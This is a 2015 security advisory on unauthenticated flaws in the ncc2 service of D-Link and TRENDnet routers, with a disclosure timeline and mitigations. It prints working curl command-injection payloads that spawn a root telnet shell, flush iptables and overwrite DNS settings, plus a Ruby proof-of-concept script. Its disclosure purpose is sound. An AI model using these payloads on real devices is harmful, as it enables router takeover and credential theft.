@@ -1,0 +1,407 @@
+id: 23345
+date: 03/03/2015
+title: D-Link and TRENDnet 'ncc2' service - multiple Vulnerabilities
+author: Peter Adkins
+cves: 
+
+>> D-Link and TRENDnet 'ncc2' service - multiple vulnerabilities
+
+Discovered by:
+----
+Peter Adkins
+
+Access:
+----
+Local network; unauthenticated access.
+Remote network; unauthenticated access*.
+Remote network; 'drive-by' via CSRF.
+
+Tracking and identifiers:
+----
+CVE - Mitre contacted; not yet allocated.
+
+Platforms / Firmware confirmed affected:
+----
+D-Link DIR-820L (Rev A) - v1.02B10
+D-Link DIR-820L (Rev A) - v1.05B03
+D-Link DIR-820L (Rev B) - v2.01b02
+TRENDnet TEW-731BR (Rev 2) - v2.01b01
+
+Additional platforms believed to be affected:
+----
+D-Link DIR-808L (Rev A) - v1.03b05
+D-Link DIR-810L (Rev A) - v1.01b04
+D-Link DIR-810L (Rev B) - v2.02b01
+D-Link DIR-826L (Rev A) - v1.00b23
+D-Link DIR-830L (Rev A) - v1.00b07
+D-Link DIR-836L (Rev A) - v1.01b03
+
+Vendor involvement:
+----
+2015-01-11 - Issues reported to D-Link via email (security contact).
+2015-01-11 - Issues reported to TRENDnet via support ticket.
+2015-01-12 - Initial response from TRENDnet.
+2015-01-14 - Initial response from D-Link (security contact).
+2015-01-19 - Email to Mitre.
+2015-01-19 - TRENDnet request a few days to validate vulnerabilities.
+2015-01-26 - TRENDnet confirm vulnerabilities and commit to Feb 10 fix.
+2015-02-01 - Initial response from Mitre.
+2015-02-04 - Requested an update from D-Link (security contact).
+2015-02-10 - TRENDnet release 2.02b01 resolving vulnerabilities.
+2015-02-10 - Emailed Mitre requesting follow up.
+2015-02-10 - Emailed D-Link requesting follow up (security contact).
+2015-02-18 - Emailed D-Link requesting follow up (security contact).
+2015-02-21 - Contacted D-Link support as I had not still not heard back.
+2015-02-22 - D-Link support were unsure as to my query.
+2015-02-22 - Replied to D-Link support clarifying my request.
+2015-02-23 - D-Link support directed me to the security reporting guide.
+2015-02-26 - Vulnerability published to Bugtraq and GitHub.
+
+Mitigation:
+----
+* Ensure remote / WAN management is disabled on the affected devices.
+
+* Only allow trusted devices access to the local network.
+
+* If using a listed TRENDnet device, install the patched firmware issued
+by the vendor.
+
+* If using a listed D-Link device, you'll need to use a third party tool
+such as µBlock (Chrome, Firefox and Safari) to blacklist requests to
+your router. This isn't ideal, but it's better than the alternative.
+
+Notes:
+----
+* Due to the nature of the the 'ping.ccp' vulnerability, an attacker can
+gain root access, hijack DNS settings or execute arbitrary commands on
+these devices with the user simply visiting a web page with a malicious
+HTTP form embedded (via CSRF).
+
+* Due to the location of this issue (ncc / ncc2) these vulnerabilities
+may be present in other devices and firmware versions not listed in this
+document.
+
+* D-Link initially responded on their security contact within a week.
+However, after I had provided write ups of these vulnerabilities it went
+quiet. In over a month I have been unable to get any sort of response
+from D-Link, including as to whether they have managed to replicate
+these issues or when there will be a fix. I contacted D-Link support as
+a last ditch effort to reestablish contact, however I was linked back to
+the same security reporting process I had followed initially.
+
+* Remote execution of these exploits is possible, but requires the
+device to already have remote / WAN management enabled; except in the
+case of 'ping.ccp', as above.
+
+* If you have a D-Link device that is believed to be affected and can
+confirm whether the PoC is successful, please let me know and I will
+update the copy of this document on GitHub (see below) and provide
+credit for your findings.
+
+* A copy of this document, as well as the proof of concept below and a
+more detailed write-up has been made available via GitHub:
+
+ * https://github.com/darkarnium/secpub/tree/master/Multivendor/ncc2
+
+----
+fwupgrade.ccp
+----
+
+The ncc / ncc2 service on the affected devices allows for basic firmware
+and language file upgrades via the web interface. During the operation,
+a HTTP POST is submitted to a resource named 'fwupgrade.ccp'.
+
+The request appears to be executed by the ncc / ncc2 service on the
+device, which runs as the root user.
+
+Unfortunately, the filtering on this resource does not appear to be
+effective, as: file / MIME type filtering is not being performed; and
+the 'on-failure' redirection to the login page is being performed AFTER
+a file has already been written the the filesystem in full.
+
+As a result of the above, this resource can be used to upload files to
+the filesystem of devices running vulnerable versions of ncc / ncc2
+without authentication. This is also possible over the internet if
+WAN / remote management has been previously enabled on the device.
+
+To compound the issue, at least in the case of the listed devices, files
+are written to a ramfs filesystem which is mounted at '/var/tmp'. This
+becomes an issue as this directory is also used to store volatile system
+configuration files - as the root filesystem is mounted read-only.
+
+The files under '/var/tmp' include 'resolv.conf', allowing for an
+attacker to hijack a user's DNS configuration:
+
+# Overwrite the DNS resolver with Google DNS
+echo 'nameserver 8.8.8.8' > resolv.conf
+curl \
+ -i http://192.168.0.1/fwupgrade.ccp \
+ -F action=fwupgrade \
+ -F filename=resolv.conf \
+ -F file=@resolv.conf
+
+----
+ping.ccp
+----
+
+The ncc / ncc2 service on the affected devices allow for basic 'ping'
+diagnostics to be performed via the 'ping.ccp' resource. Unfortunately,
+it appears that strings passed to this call are not correctly sanitized.
+
+Much in the same manner as above, the request appears to be executed by
+the ncc / ncc2 service on the device, which is run as the root user.
+
+The handler for 'ping_v4' does not appear to be vulnerable as this
+resource maps the components of a IPv4 address, represented by a dotted
+quad, into a format of '%u.%u.%u.%u' at execution time.
+
+However, 'ping_ipv6' references the user provided input directly as a
+string ('%s'), which is then passed to a system() call. This formatting
+allows for an attacker to pass arbitrary commands to the device through
+a HTTP request.
+
+As this resource is also able to be accessed without authentication, it
+provides a vector for an attacker to execute arbitrary commands on the
+device - including, but not limited to, DNS hijacking and WAN firewall
+disablement - via CSRF.
+
+# Spawn a root shell (telnet)
+curl \
+ -i http://192.168.0.1/ping.ccp \
+ --data 'ccp_act=ping_v6&ping_addr=$(telnetd -l /bin/sh)'
+
+# Flush the iptables INPUT chain and set the default policy to ACCEPT.
+curl \
+ -i http://192.168.0.1/ping.ccp \
+ --data 'ccp_act=ping_v6&ping_addr=$(iptables -P INPUT ACCEPT)'
+curl \
+ -i http://192.168.0.1/ping.ccp \
+ --data 'ccp_act=ping_v6&ping_addr=$(iptables -F INPUT)'
+
+----
+UDPServer / MP Daemon
+----
+
+Note: This vulnerability does not seem to be present in firmware
+versions before 1.05B03 on the DIR-820LA1. This may differ on other
+platforms.
+
+The ncc / ncc2 service on the affected devices appears to have been
+shipped with a number of diagnostic hooks available. Unfortunately, much
+in the same manner as the vulnerabilities discussed above, these hooks
+are able to be called without authentication.
+
+These hooks are also callable via CSRF; although a moot point given that
+the 'ping.ccp' vulnerability discussed above already yields a higher
+level of access to the device via the same manner.
+
+One of the more 'interesting' hooks exposed by these devices allow for
+a 'UDPServer' process to be spawned on the device when called. When
+started this process listens on the devices LAN IP for data on UDP 9034.
+
+Unfortunately, this process does not appear to perform any sort of input
+sanitization before passing user input to a system() call. Further
+investigation finds that the source for this service (UDPServer) is
+available in the RealTek SDK, and appears to be a diagnostic tool.
+
+As a result of the above, this process is vulnerable to arbitrary
+command injection.
+
+# Spawn a root shell (telnet)
+curl -i 192.168.0.1/test_mode.txt
+echo "\`telnetd -l /bin/sh\`" > /dev/udp/192.168.0.1/9034
+
+----
+Diagnostic hooks
+----
+
+Further to the 'test_mode' hook discussed above, the ncc / ncc2 service
+on the affected devices appear to have been shipped with a number of
+other diagnostic hooks enabled by default:
+
+ * tftpd_ready.txt
+ * chklst.txt
+ * wps_default_pin.txt
+ * usb_connect.txt
+ * wps_btn.txt
+ * reset_btn.txt
+ * reboot_btn.txt
+ * calibration_ready24G.txt
+ * calibration_ready5G.txt
+ * restore_default_finish.txt
+ * set_mac_finish.txt
+ * test_mode.txt
+ * wifist.txt
+
+These resources do not exist on the filesystem of the device, nor do
+they appear to be static. Instead, these files appear to be rendered
+when queried and can be used to both interrogate the given device for
+information, as well as enable diagnostic services on demand.
+
+Unfortunately, these hooks are able to be queried without any form of
+authentication, and are accessible by attackers on the local network,
+and over the internet via WAN management (if enabled), and CSRF.
+
+A brief descriptions for each of these hooks is provided below. Those
+not listed provide either unknown functionality, or binary values which
+appear to represent system GPIO states (*_btn.txt).
+
+- tftp_ready.txt
+
+When queried, this resource spawns a tftp daemon which has a root
+directory of '/'. As TFTP requires no authentication, this service can
+be used to extract credentials from the device or even download files
+from an external storage device connected via USB.
+
+Unfortunately, due to the way this data is stored on the system, all
+credentials appear to be available in plain-text. These credentials can
+include (depending on the vendor and device configuration):
+
+ * GUI / Device management credentials
+ * Samba credentials
+ * PPPoE credentials
+ * Email credentials
+ * 'MyDlink' credentials (on D-Link devices)
+
+- chklst.txt
+
+When queried, this resource will return the following information:
+
+ * Current WLAN SSIDs
+ * Current WLAN channels
+ * LAN and WAN MAC addressing
+ * Current Firmware version information
+ * Hardware version information
+ * Language information
+
+- wps_default_pin.txt
+
+When queried, this resource will return the default / factory WPS pin
+for the device.
+
+- usb_connect.txt
+
+When queried, this resource will return a binary value which indicates
+whether an external device is connected to the USB port on the device -
+or null in the case of devices that do not have an exposed USB port.
+
+This resource could potentially by used by an attacker to enumerate
+devices with USB storage attached.
+
+----
+Ruby PoC
+----
+
+# NCC2 PoC.
+
+require 'pp'
+require 'optparse'
+require 'restclient'
+
+# Set defaults and parse command line arguments
+options = {}
+
+options[:addr] = "192.168.0.1"
+options[:port] = 80
+
+OptionParser.new do |option|
+
+  option.on("--address [ADDRESS]", "Destination hostname or IP") do |a|
+    options[:addr] = a
+  end
+
+  option.on("--port [PORT]", "Destination TCP port") do |p|
+    options[:port] = p
+  end
+
+  option.parse!
+
+end
+
+# Define which SOAPActions we will be using.
+actions = [
+  {
+    :name => "Get device information",
+    :call => "sloppy_parser",
+    :path => "chklst.txt",
+  },
+  {
+    :name => "Has USB device connected",
+    :call => "txt_parser",
+    :path => "usb_connect.txt",
+  },
+  {
+    :name => "Get WPS default pin",
+    :call => "txt_parser",
+    :path => "wps_default_pin.txt",
+  },
+  {
+    :name => "Enable UDPServer",
+    :call => "noop",
+    :path => "test_mode.txt",
+  },
+  {
+    :name => "Enable TFTP service",
+    :call => "noop",
+    :path => "tftpd_ready.txt",
+  },
+  {
+    :name => "Enable telnet (root)",
+    :call => "noop",
+    :path => "ping.ccp",
+    :post => {
+      "ccp_act" => "ping_v6",
+      "ping_addr" => "$(telnetd -l /bin/sh)"
+    }
+  }
+]
+
+def noop(val)
+  return
+end
+
+def sloppy_parser(slop)
+  slop.split(/\<br \/\>/).each do |l|
+    puts "    #{l}"
+  end
+end
+
+def txt_parser(txt)
+  l = txt.gsub(/\=/, ': ')
+  puts "    #{l}"
+end
+
+# Iterate over all actions and attempt to execute.
+url = "http://#{options[:addr]}:#{options[:port]}"
+
+puts "[!] Attempting to extract information from #{url}"
+
+actions.each do |action|
+
+  # Build the target URL and setup the HTTP client object.
+  request = RestClient::Resource.new("#{url}/#{action[:path]}")
+
+  # Fire the request and ensure a 200 OKAY.
+  begin
+    if action[:post]
+      response = request.post(action[:post])
+    else
+      response = request.get()
+    end
+  rescue
+    puts "[!] Failed to query remote host."
+    abort
+  end
+
+  if response.code != 200
+    puts "[-] '#{action[:name]}' failed with response: #{response.code}"
+    next
+  end
+
+  # Send to the processor.
+  puts "[*] #{action[:name]} request succeeded."
+  send(action[:call], response.body())
+
+end
+
+#  0day.today [2023-03-23]  #
